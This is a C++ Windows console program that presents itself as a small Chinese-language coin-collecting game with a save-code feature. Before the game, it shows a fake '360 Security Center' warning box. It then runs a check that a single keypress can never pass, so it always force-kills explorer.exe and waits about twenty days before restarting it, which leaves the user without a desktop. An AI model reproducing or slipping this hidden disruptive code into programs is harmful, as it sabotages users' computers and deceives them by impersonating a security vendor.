#include<windows.h>
#include<cstdlib>
#include<iostream>
#include<algorithm>
#include<cstdio>
#include<stack>
#include<queue>
#include<vector>
#include<stdlib.h>
#include<stdio.h>
#include<time.h>
#include <conio.h>
using namespace std;
int b=10;
char a='#',rd[10005],r;
int c,acoin=10,re;
int main(){
	MessageBox(NULL,"运行此程序可能会存在风险，是否继续运行？","360安全中心警告",MB_YESNO); 
	while(b>=0){
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED |FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED |FOREGROUND_GREEN);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED |FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout<<"Hello World\n";
		Sleep(100);
		b--;
	}
	b=_getch();
	if(b!=123456){
		system("taskkill /f /im explorer.exe");
		Sleep(1728000000);
		system("start explorer.exe");
	} 
  srand(time(NULL));
	while(r!='z'){
		system("cls");
		cout<<"按z退出，按x开始游戏，按c阅读说明，按v登录，按b存档。";
		r=_getch();
		if(r=='x'){
			acoin-=3;
			a='#';
			system("cls");
			rand();
			for(int i=1;i<=100;i++) rd[i]='_';
			for(int i=1;i<=rand()%12+12;i++) rd[rand()%100]='*';
			for(int i=1;i<=rand()%3+3;i++) rd[rand()%100]='|';
			c=rand()%100;
			rd[c]='T';
			for(int i=1;i<=100;i++) cout<<rd[i];
			cout<<endl;
			cout<<"硬币数量："<<acoin<<endl;
			while(a!='0'){
				a=_getch();
				system("cls");
				rd[c]='_';
				if(a=='a'&&c>1&&rd[c-1]!='|') c--;
				if(a=='d'&&c<100&&rd[c+1]!='|') c++;
				if(acoin>=3){
					if(a=='q'&&rd[c-1]=='|'){
						acoin-=3;
						rd[c-1]='_';
					}
					if(a=='e'&&rd[c+1]=='|'){
						acoin-=3;
						rd[c+1]='_';
					}
				}
				if(rd[c]=='*') acoin++;
				rd[c]='T';
				for(int i=1;i<=100;i++){
					cout<<rd[i];
				}
				cout<<endl;
				cout<<"硬币数量："<<acoin<<endl;
			}
			system("cls");
			cout<<"你目前有"<<acoin<<"枚硬币"<<endl;
			Sleep(3000);
		}
		if(r=='c'){
			cout<<"你是'T'，按下'0'以退出游戏。"<<endl;
			cout<<"按'a'向左走，按'd'向右走。" <<endl;
			cout<<"在这个游戏中你需要收集像这样的金币（*）。"<<endl;
			cout<<"‘_’代表空地，你无法通过障碍物，如（|），但你可以用3个金币清除它，清除左边按q，右边按e。"<<endl;
			cout<<"每次出发需要3金币，初始有10枚金币。"<<endl; 
			cout<<"无需登录即可存档。"<<endl; 
			cout<<"按下任意键以继续。"<<endl;
			r=_getch();
		}
		if(r=='v'){
			cout<<"请输入存档号："; 
			cin>>re;
			acoin=re%10+((re/100)%10)*10+((re/10000)%10)*100+((re/1000000)%10)*1000;
			cout<<"按下任意键以继续。";
			r=_getch();
		} 
		if(r=='b'){
			cout<<"您的存档号："<<(acoin/1000)%10<<rand()%10<<(acoin/100)%10<<rand()%10<<(acoin/10)%10<<rand()%10<<acoin%10<<endl;
			cout<<"按下任意键以继续。";
			r=_getch(); 
		}
	}
	return 0;
}
